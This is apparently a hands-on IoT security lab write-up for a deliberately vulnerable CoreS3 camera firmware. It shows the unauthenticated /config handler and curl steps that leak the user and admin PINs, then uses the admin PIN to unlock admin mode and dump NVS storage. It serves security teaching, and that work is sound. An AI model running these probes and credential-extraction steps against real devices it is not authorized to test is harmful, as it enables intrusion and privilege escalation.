# L15: Unauthorized Configuration Access

## Goal
Access the device configuration endpoint without authentication to extract sensitive data including admin and user PINs.

## Background

**Why this matters**: Configuration endpoints without authentication allow attackers to read critical device settings remotely, enabling information disclosure, authentication bypass, and privilege escalation.

**What you're looking for in IoT devices:**
- Configuration endpoints without authentication (`/config`, `/api/config`, `/api/settings`)
- Sensitive data exposed in configuration responses (PINs, passwords, API keys)
- Broken access control (authentication exists on some endpoints but not others)

**Why this happens:**
- Developers assume only admins can find certain endpoints ("security through obscurity")
- Authentication disabled for testing and never re-enabled
- Broken access control where authentication is not enforced uniformly across all endpoints

**On CoreS3**: The `GET /config` endpoint returns the full device configuration - including user PIN, admin PIN, WiFi SSID, device ID, and debug mode status - without requiring any authentication. Compare with `/settings`, which properly requires an admin JWT validated through `verifyJWT()` and `extractClaims()`.

**Vulnerable pattern (from firmware):**
```cpp
void CameraDevice::handleConfig() {
    // VULNERABLE: No authentication required
    String response = "Device Configuration\n\n";
    response += "User PIN: " + userPIN + "\n";
    response += "Admin PIN: " + adminPIN + "\n";
    response += "WiFi SSID: " + apSSID + "\n";
    response += "Device ID: " + deviceID + "\n";
    response += "Debug Mode: " + String(debugMode ? "ON" : "OFF") + "\n";
    webServer->send(200, "text/plain", response);
}
```

Compare with the properly protected `/settings` endpoint:
```cpp
void CameraDevice::handleSettings() {
    // Requires admin JWT with role == "admin"
    String token = "";
    String auth = webServer->header("Authorization");
    if (auth.startsWith("Bearer ")) token = auth.substring(7);
    // ... verifyJWT(token) && extractClaims(token, user, role) && role == "admin"
}
```

## Lab Walkthrough

### Step 1: Connect to the Device

Connect to the CoreS3 WiFi AP (open, no password) and verify the web interface is accessible.

```bash
# Connect to the device AP (shown on device screen)
# SSID: CoreS3-CAM-XXXX (open, no password)
# Device IP: 192.168.4.1 (default AP gateway)

# Verify web interface is up
curl -s http://192.168.4.1/ | head -5

# Expected response:
# <!DOCTYPE html><html><head>...
```

### Step 2: Discover the Configuration Endpoint

Probe common configuration endpoint paths to map the device's API surface.

```bash
# Probe common configuration endpoints
curl -s -o /dev/null -w "%{http_code} %{url}\n" http://192.168.4.1/config
curl -s -o /dev/null -w "%{http_code} %{url}\n" http://192.168.4.1/status
curl -s -o /dev/null -w "%{http_code} %{url}\n" http://192.168.4.1/settings
curl -s -o /dev/null -w "%{http_code} %{url}\n" http://192.168.4.1/admin/status

# Expected results:
# 200 http://192.168.4.1/config      <- No auth required!
# 200 http://192.168.4.1/status      <- Public status (no secrets)
# 401 http://192.168.4.1/settings    <- Requires admin JWT
# 401 http://192.168.4.1/admin/status <- Requires admin JWT
```

### Step 3: Access the Configuration Endpoint

Send a `GET` request to `/config` without any authentication and examine the response for sensitive data.

```bash
# Access config endpoint - no auth token, no cookies, no credentials
curl http://192.168.4.1/config

# Expected response:
Device Configuration

User PIN: XXXXXX
Admin PIN: YYYYYY
WiFi SSID: CoreS3-CAM-ABCDEF
Device ID: XXXXXXXXXXXX
Debug Mode: OFF
```

**Expected serial output:**
```
[WEB] GET /config
```

No authentication check or warning appears in the serial logs - the request is processed unconditionally.

### Step 4: Verify No Authentication is Required

Compare `/config` behavior with protected endpoints to demonstrate inconsistent access control.

```bash
# /config works without any auth (broken access control)
curl -v http://192.168.4.1/config 2>&1 | grep -E "^(<|Device|User|Admin)"

# Expected:
# < HTTP/1.1 200 OK
# Device Configuration
# User PIN: XXXXXX
# Admin PIN: YYYYYY

# Compare with /settings which requires admin JWT
curl -v http://192.168.4.1/settings 2>&1 | grep -E "^(<|Unauthorized)"

# Expected:
# < HTTP/1.1 401 Unauthorized
# Unauthorized - Admin access required

# Compare with /admin/status which also requires admin JWT
curl -v http://192.168.4.1/admin/status 2>&1 | grep -E "^(<|Unauthorized)"

# Expected:
# < HTTP/1.1 401 Unauthorized
# Unauthorized

# The /status endpoint is public but does NOT leak PINs
curl -s http://192.168.4.1/status | python3 -m json.tool

# Expected:
{
    "device_id": "XXXXXXXXXXXX",
    "version": "1.0.0",
    "build": "debug",
    "firmware": "1.0.0",
    "ip_address": "192.168.4.1",
    "camera_initialized": true,
    "admin_mode": false,
    "debug_mode": false,
    "uptime": 1234,
    "free_heap": 245760,
    "free_psram": 8000000
}
```

**Expected serial output for all requests:**
```
[WEB] GET /config
[WEB] /settings
[SETTINGS] Rejected: Not admin
[WEB] GET /admin/status
```

### Step 5: Extract and Use the Admin PIN

Use the leaked admin PIN to unlock admin mode on the touchscreen and access protected serial commands.

```bash
# The admin PIN from /config response can be used:

# 1. Via serial console: login <admin_pin>
#    - Unlocks admin mode for all admin commands

# 2. On the device touchscreen to unlock admin mode
#    - Enter the 6-digit admin PIN from the /config response

# 3. Via serial console to dump NVS (after login)
pio device monitor -b 115200

cores3-cam> nvs-dump

# Before admin mode:
# === NVS Dump (Key/Value Pairs) ===
# ERROR: Admin privileges required.

# After admin login:
cores3-cam> nvs-dump
# Returns raw NVS key/value pairs including WiFi password

# 4. Chain with other labs:
#    - L01: nvs-dump requires admin privileges
#    - L08: Use admin PIN to verify JWT-forged admin access
```

### Step 6: Observe Serial Output During the Attack

Monitor the UART serial console while accessing `/config` to observe server-side logging.

```bash
# In terminal 1: Connect to serial console
pio device monitor -b 115200

# In terminal 2: Send the curl request
curl http://192.168.4.1/config

# Serial output in terminal 1:
[WEB] GET /config
```

No authentication-related log messages appear - no `[LOGIN]`, no `Rejected`, no `Unauthorized` - because the handler has no authentication code. Compare with `/settings` without auth:

```
[WEB] /settings
[SETTINGS] Rejected: Not admin
```

## Impact

- **Information disclosure**: User PIN, admin PIN, WiFi SSID, and device ID leaked without authentication
- **Authentication bypass**: Leaked admin PIN unlocks admin mode on the touchscreen
- **Privilege escalation**: Any network client obtains admin credentials without authentication
- **Chained attacks**: Admin PIN enables NVS dump via serial, debug mode, device settings via `/settings` with JWT

## References

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [ESP32 WebServer Library](https://docs.espressif.com/projects/arduino-esp32/en/latest/api/webserver.html)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)
